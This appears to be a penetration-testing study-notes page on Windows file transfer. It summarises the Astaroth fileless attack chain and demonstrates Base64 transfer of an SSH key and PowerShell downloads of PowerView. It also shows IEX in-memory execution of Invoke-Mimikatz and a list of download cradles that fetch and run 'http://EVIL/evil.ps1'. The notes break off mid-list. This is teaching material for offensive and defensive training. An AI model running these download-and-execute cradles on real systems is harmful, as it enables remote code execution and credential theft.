+  <a href="#file-transfer-via-bitsadmin" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer via Bitsadmin
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#decoding-payloads-with-certutil" class="md-nav__link">
+    <span class="md-ellipsis">
+      Decoding Payloads with Certutil
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-with-regsvr32" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution with regsvr32
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-payload-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Payload Injection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visual-representation-of-the-astaroth-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Visual Representation of the Astaroth Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#download-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Download Operations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell-based64-encode-decode" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Based64 Encode &amp; Decode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PowerShell Based64 Encode & Decode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#steps-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#use-case-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Use Case Example:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advantages" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advantages:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwnbox-check-ssh-key-md5-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwnbox Check SSH Key MD5 Hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwnbox-encode-ssh-key-to-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pwnbox Encode SSH Key to Base64
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#confirming-the-md5-hashes-match" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming the MD5 Hashes Match
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notes-on-file-transfer-using-powershell-and-webclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notes on File Transfer Using PowerShell and WebClient
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Notes on File Transfer Using PowerShell and WebClient">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-transfer-with-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      File Transfer with PowerShell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer with PowerShell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webclient-methods-for-downloading-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      WebClient Methods for Downloading Data
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-powershell-downloadfile-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example: PowerShell DownloadFile Method
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-downloadstring-fileless-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell DownloadString-Fileless Method
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-invoke-webrequest" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Invoke-WebRequest
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-of-commands-by-harmj0y" class="md-nav__link">
+    <span class="md-ellipsis">
+      List of commands by HarmJ0y
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Downloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-the-smb-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create the sMB Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#copy-a-file-from-the-smb-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Copy a File from the SMB Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-the-smb-server-with-a-username-and-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create the SMB Server with a Username and Password
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mount-the-smb-server-with-username-and-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mount the SMB Server with Username and Password
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Mount the SMB Server with Username and Password">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powershell-base64-web-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Base64 Web Upload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-encoding-the-file-in-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Encoding the File in Base64
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-uploading-the-encoded-file-via-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Uploading the Encoded File via HTTP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-catching-the-data-with-netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Catching the Data with Netcat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-decoding-the-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Decoding the File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-uploads-via-webdav" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Uploads via WebDAV
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-webdav-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up WebDAV Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connecting-to-the-webdav-share" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connecting to the WebDAV Share
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-via-webdav" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading Files via WebDAV
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Uploads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-ftp-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up the FTP Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-files-via-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading Files via PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-an-ftp-command-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating an FTP Command File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recap
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><strong>Overview</strong></p>
+<p>The Windows operating system has evolved significantly, with new versions introducing various utilities for file transfer operations. Understanding file transfer mechanisms in Windows is crucial for both attackers and defenders:</p>
+<ul>
+<li>
+<p><strong>Attackers</strong>: Leverage file transfer methods to operate stealthily and evade detection.</p>
+</li>
+<li>
+<p><strong>Defenders</strong>: Learn how these methods work to monitor and enforce policies that prevent attacks.</p>
+</li>
+</ul>
+<p>To illustrate, we will examine the Microsoft Astaroth Attack, a documented advanced persistent threat (APT) example.</p>
+<h2 id="fileless-threats-and-file-transfer">Fileless Threats and File Transfer</h2>
+<p>The Astaroth attack demonstrates how attackers utilize fileless techniques to execute their operations. Despite the name, fileless threats often involve file transfer operations, though the files themselves are not stored on disk but executed in memory.</p>
+<h2 id="what-are-fileless-threats">What Are Fileless Threats?</h2>
+<ul>
+<li>Fileless threats leverage legitimate tools and processes already present on a system to carry out attacks.</li>
+<li>These threats do not leave traditional files behind, making detection more challenging.</li>
+</ul>
+<h2 id="breakdown-of-the-astaroth-attack">Breakdown of the Astaroth Attack</h2>
+<ol>
+<li>
+<p><strong>Initial Infection via Spear-Phishing</strong></p>
+<ul>
+<li>A malicious link embedded in a spear-phishing email leads to the download of an LNK file.</li>
+<li>The user clicks the LNK file, triggering execution.</li>
+</ul>
+</li>
+<li>
+<h2 id="abuse-of-wmic-tool">Abuse of WMIC Tool</h2>
+<ul>
+<li>The WMIC tool (Windows Management Instrumentation Command-line) is executed with the "/Format" parameter.</li>
+<li>This parameter is abused to download and execute malicious JavaScript code.</li>
+</ul>
+</li>
+<li>
+<h2 id="file-transfer-via-bitsadmin">File Transfer via Bitsadmin</h2>
+<ul>
+<li>The malicious JavaScript code downloads additional payloads using the Bitsadmin tool, a legitimate utility for background file transfers.</li>
+</ul>
+</li>
+<li>
+<h2 id="decoding-payloads-with-certutil">Decoding Payloads with Certutil</h2>
+<ul>
+<li>Downloaded payloads are Base64-encoded.</li>
+<li>The Certutil tool is used to decode these payloads into their original form, resulting in multiple DLL files.</li>
+</ul>
+</li>
+<li>
+<h2 id="execution-with-regsvr32">Execution with regsvr32</h2>
+<ul>
+<li>
+<p>One of the decoded DLLs is loaded using the regsvr32 tool.</p>
+</li>
+<li>
+<p>This DLL decrypts and loads additional files until the final payload is ready.</p>
+</li>
+</ul>
+</li>
+<li>
+<h2 id="final-payload-injection">Final Payload Injection</h2>
+<ul>
+<li>The final payload, Astaroth, is injected into the Userinit process, allowing the attacker to persist and execute their malicious operations stealthily.</li>
+</ul>
+</li>
+</ol>
+<h2 id="visual-representation-of-the-astaroth-attack">Visual Representation of the Astaroth Attack</h2>
+<p>Below is a high-level graphical depiction of the attack:</p>
+<ol>
+<li>
+<p>Spear-phishing email ➔ LNK file.</p>
+</li>
+<li>
+<p>Execution of WMIC with /Format parameter.</p>
+</li>
+<li>
+<p>JavaScript downloads payloads using Bitsadmin.</p>
+</li>
+<li>
+<p>Certutil decodes Base64 payloads into DLL files.</p>
+</li>
+<li>
+<p>regsvr32 loads DLLs, decrypting and loading additional files.</p>
+</li>
+<li>
+<p>Final payload (Astaroth) is injected into the Userinit process.</p>
+</li>
+</ol>
+<p><strong>Understanding such attacks allows defenders to:</strong></p>
+<ul>
+<li>
+<p>Detect unusual activity from legitimate tools (e.g., WMIC, Certutil, regsvr32).</p>
+</li>
+<li>
+<p>Monitor file transfer methods and create preventive policies.</p>
+</li>
+</ul>
+<p>Attackers continue to innovate, but knowledge of their methods ensures defenders can remain vigilant and respond effectively.</p>
+<p><img alt="tha" src="../../../Assets/attachments/fig1a-astaroth-attack-chain.png" /></p>
+<h2 id="download-operations">Download Operations</h2>
+<p>We have access to the machine MS02 and we need to download a file from Pwnbox machine.
+let's see how we can accomplish this using multiple File Download methos.</p>
+<h2 id="powershell-based64-encode-decode">PowerShell Based64 Encode &amp; Decode</h2>
+<p><strong>Purpose:</strong>
+to transfer files without requiring network communication, particulary in situations where only terminal access is availble.</p>
+<h3 id="steps-overview">Steps Overview</h3>
+<ol>
+<li>
+<p><strong>Base64 Econding and Decoding</strong></p>
+<ul>
+<li>Use terminal commands to encode a file into a base64 string.</li>
+<li>Copy the cocoded string from the source terminal.</li>
+<li>Decode the base64 string back into the original file on the target system.</li>
+</ul>
+</li>
+<li>
+<p><strong>Ensuring File Integrity:</strong></p>
+<ul>
+<li>Verfiy that the transferred file is correct by comparing its <em>MD5 checksum</em>.</li>
+<li>Use <code>md5sum</code> (or equivalent tools) to calculate the compare MD5 hash before and after the transfer.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Detailed Process:</strong>
+1. Encoding a File to Base64 (Source System):
+In PowerShell:
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">[</span>Convert<span class="o">]</span>::ToBase64String<span class="o">((</span>Get-Content<span class="w"> </span>-Path<span class="w"> </span><span class="s2">&quot;file.txt&quot;</span><span class="w"> </span>-Encoding<span class="w"> </span>byte<span class="o">))</span><span class="w"> </span>&gt;<span class="w"> </span>encoded.txt
+</code></pre></div>
+    OR in linux
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>base64<span class="w"> </span>file.txt<span class="w"> </span>&gt;<span class="w"> </span>encoded.txt
+</code></pre></div></p>
+<ol>
+<li><strong>Transfer Base64 String:</strong><ul>
+<li>Open the encoded file (encoded.txt) in the terminal.</li>
+<li>Copy its contents manually to the target system's terminal.</li>
+</ul>
+</li>
+<li>Decoding the File on the Target System:
+In PowerShell:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">[</span>IO.File<span class="o">]</span>::WriteAllBytes<span class="o">(</span><span class="s2">&quot;file_decoded.txt&quot;</span>,<span class="w"> </span><span class="o">[</span>Convert<span class="o">]</span>::FromBase64String<span class="o">((</span>Get-Content<span class="w"> </span>-Path<span class="w"> </span><span class="s2">&quot;encoded.txt&quot;</span><span class="o">)))</span>
+</code></pre></div>
+OR linux
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>base64<span class="w"> </span>-d<span class="w"> </span>encoded.txt<span class="w"> </span>&gt;<span class="w"> </span>file_decode.txt
+</code></pre></div></li>
+<li>
+<p>Verify File Integrity</p>
+<ul>
+<li>On both systems, generate the MD5 hash of the original and decoded file.</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="w">    </span>md5sum<span class="w"> </span>file.txt
+</code></pre></div>
+Compare the hashes. if they match, the file transfer was successful. </p>
+</li>
+</ol>
+<h3 id="use-case-example">Use Case Example:</h3>
+<ul>
+<li>Transferring an SSH key:<ul>
+<li>Encode the key on the source system.</li>
+<li>Copy the base64 string to the target system.</li>
+<li>Decode the string back into the original SSH key file.</li>
+<li>Verify the integrity using the MD5 checksum.</li>
+</ul>
+</li>
+</ul>
+<h3 id="advantages">Advantages:</h3>
+<ul>
+<li>No need for network connectivity.</li>
+<li>Useful for secure environments with restricted communication channels.</li>
+</ul>
+<p><strong>Considerations</strong>:
+- Ensure proper copying and pasting of the base64 string to avoid corruption.
+- MD5 is not cryptographically secure for authentication purposes but is adequate for verifying file integrity.</p>
+<h2 id="pwnbox-check-ssh-key-md5-hash">Pwnbox Check SSH Key MD5 Hash</h2>
+<div class="codehilite"><pre><span></span><code>```bash
+    md5sum id_rsa
+```
+output:
+```4e301756a07ded0a2dd6953abf015278  id_rsa```
+</code></pre></div>
+
+<h2 id="pwnbox-encode-ssh-key-to-base64">Pwnbox Encode SSH Key to Base64</h2>
+<div class="codehilite"><pre><span></span><code>```bash
+cat id_rsa |base64 -w 0;echo
+
+LS0tLS1CRUdJT.....
+```
+</code></pre></div>
+
+<p>We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>PS<span class="w"> </span>C:<span class="se">\h</span>tb&gt;<span class="w"> </span><span class="o">[</span>IO.File<span class="o">]</span>::WriteAllBytes<span class="o">(</span><span class="s2">&quot;C:\Users\Public\id_rsa&quot;</span>,<span class="w"> </span><span class="o">[</span>Convert<span class="o">]</span>::FromBase64String<span class="o">(</span><span class="s2">&quot;LS0tLS1CRUdJTiBPUEVO...&quot;</span><span class="o">))</span>
+</code></pre></div>
+<p>Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.</p>
+<h2 id="confirming-the-md5-hashes-match">Confirming the MD5 Hashes Match</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Get-FileHash<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\i</span>d_rsa<span class="w"> </span>-Algorithm<span class="w"> </span>md5
+</code></pre></div>
+<img alt="alt text" src="../../../Assets/attachments/get-filehash.png" /></p>
+<p><code>Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</code></p>
+<h1 id="notes-on-file-transfer-using-powershell-and-webclient">Notes on File Transfer Using PowerShell and WebClient</h1>
+<p>Most companies allow <strong>HTTP</strong> and <strong>HTTPS</strong> outbound traffic through the firewall to facilitate employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. However, defenders can implement <strong>Web filtering solutions</strong> to:</p>
+<ul>
+<li>Prevent access to specific website categories.</li>
+<li>Block the download of certain file types (e.g., <code>.exe</code>).</li>
+<li>Restrict access to a whitelist of domains in highly controlled networks.</li>
+</ul>
+<h2 id="file-transfer-with-powershell">File Transfer with PowerShell</h2>
+<p>PowerShell offers various file transfer options. In any version of PowerShell, the <code>System.Net.WebClient</code> class can be used to download files over <strong>HTTP</strong>, <strong>HTTPS</strong>, or <strong>FTP</strong>.</p>
+<h3 id="webclient-methods-for-downloading-data">WebClient Methods for Downloading Data</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>OpenRead</code></td>
+<td>Returns the data from a resource as a <code>Stream</code>.</td>
+</tr>
+<tr>
+<td><code>OpenReadAsync</code></td>
+<td>Returns the data from a resource without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><code>DownloadData</code></td>
+<td>Downloads data from a resource and returns a <code>Byte</code> array.</td>
+</tr>
+<tr>
+<td><code>DownloadDataAsync</code></td>
+<td>Downloads data from a resource as a <code>Byte</code> array without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><code>DownloadFile</code></td>
+<td>Downloads data from a resource to a local file.</td>
+</tr>
+<tr>
+<td><code>DownloadFileAsync</code></td>
+<td>Downloads data to a local file without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><code>DownloadString</code></td>
+<td>Downloads a <code>String</code> from a resource and returns a <code>String</code>.</td>
+</tr>
+<tr>
+<td><code>DownloadStringAsync</code></td>
+<td>Downloads a <code>String</code> without blocking the calling thread.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="example-powershell-downloadfile-method">Example: PowerShell <code>DownloadFile</code> Method</h3>
+<p>The <code>Net.WebClient</code> class and its <code>DownloadFile</code> method allow you to specify:</p>
+<ol>
+<li>The URL of the target file to download.</li>
+<li>The name of the output file where the content will be saved.</li>
+</ol>
+<p>Example usage:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">$webClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nv">$webClient</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;https://example.com/file.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;C:\path\to\output\file.txt&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="c"># Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="c"># Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFileAsync</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Users\Public\Downloads\PowerViewAsync.ps1&#39;</span><span class="p">)</span>
+</code></pre></div></p>
+<h2 id="powershell-downloadstring-fileless-method">PowerShell DownloadString-Fileless Method</h2>
+<p>AS we previously discussed, fileless attacks work by using some operating system functions to downlod the payload and exccute it directly. Powershell can also be used to perfom fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in the memory using the <code>Invoke-Expression</code> cmdlet or the alias <code>IEX</code>.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;https://raw.githubusercontent.com/Empire/master/data/module/source/credentials/Invoke-Mimikatz.ps1&#39;</span><span class="o">)</span>
+</code></pre></div>
+The <code>IEX</code> aslo accepts pipeline input.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>PS<span class="w"> </span>C:<span class="se">\h</span>tb&gt;<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>IEX
+</code></pre></div>
+<h2 id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest</h2>
+<p>From PowerShell 3.0 onwards, the <code>Invoke-WebRequest</code> cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="w">    </span>PS<span class="w"> </span>C:<span class="se">\h</span>tb&gt;<span class="w"> </span>Invoke-WebRequest<span class="w"> </span>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1<span class="w"> </span>-OutFile<span class="w"> </span>PowerView.ps1
+</code></pre></div>
+<code>Harmj0y</code> has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.</p>
+<h2 id="list-of-commands-by-harmj0y">List of commands by HarmJ0y</h2>
+<p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># normal download cradle</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>Net.Webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s2">&quot;http://EVIL/evil.ps1&quot;</span><span class="o">)</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># PowerShell 3.0+</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>IEX<span class="w"> </span><span class="o">(</span>iwr<span class="w"> </span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="o">)</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># hidden IE com object</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="nv">$ie</span><span class="o">=</span>New-Object<span class="w"> </span>-comobject<span class="w"> </span>InternetExplorer.Application<span class="p">;</span><span class="nv">$ie</span>.visible<span class="o">=</span><span class="nv">$False</span><span class="p">;</span><span class="nv">$ie</span>.navigate<span class="o">(</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="o">)</span><span class="p">;</span>start-sleep<span class="w"> </span>-s<span class="w"> </span><span class="m">5</span><span class="p">;</span><span class="nv">$r</span><span class="o">=</span><span class="nv">$ie</span>.Document.body.innerHTML<span class="p">;</span><span class="nv">$ie</span>.quit<span class="o">()</span><span class="p">;</span>IEX<span class="w"> </span><span class="nv">$r</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="c1"># Msxml2.XMLHTTP COM object</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nv">$h</span><span class="o">=</span>New-Object<span class="w"> </span>-ComObject<span class="w"> </span>Msxml2.XMLHTTP<span class="p">;</span><span class="nv">$h</span>.open<span class="o">(</span><span class="s1">&#39;GET&#39;</span>,<span class="s1">&#39;http://EVIL/evil.ps1&#39;</span>,<span class="nv">$false</span><span class="o">)</span><span class="p">;</span><span class="nv">$h</span>.send<span class="o">()</span><span class="p">;</span>iex<span class="w"> </span><span class="nv">$h</span>.responseText
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="c1"># WinHttp COM object (not proxy aware!)</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="nv">$h</span><span class="o">=</span>new-object<span class="w"> </span>-com<span class="w"> </span>WinHttp.WinHttpRequest.5.1<span class="p">;</span><span class="nv">$h</span>.open<span class="o">(</span><span class="s1">&#39;GET&#39;</span>,<span class="s1">&#39;http://EVIL/evil.ps1&#39;</span>,<span class="nv">$false</span><span class="o">)</span><span class="p">;</span><span class="nv">$h</span>.send<span class="o">()</span><span class="p">;</span>iex<span class="w"> </span><span class="nv">$h</span>.responseText
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="c1"># using bitstransfer- touches disk!</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>Import-Module<span class="w"> </span>bitstransfer<span class="p">;</span>Start-BitsTransfer<span class="w"> </span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="w"> </span><span class="nv">$env</span>:temp<span class="se">\t</span><span class="p">;</span><span class="nv">$r</span><span class="o">=</span>gc<span class="w"> </span><span class="nv">$env</span>:temp<span class="se">\t</span><span class="p">;</span>rm<span class="w"> </span><span class="nv">$env</span>:temp<span class="se">\t</span><span class="p">;</span><span class="w"> </span>iex<span class="w"> </span><span class="nv">$r</span>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="c1"># DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)</span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="c1">#   code to execute needs to be a base64 encoded string stored in a TXT record</span>
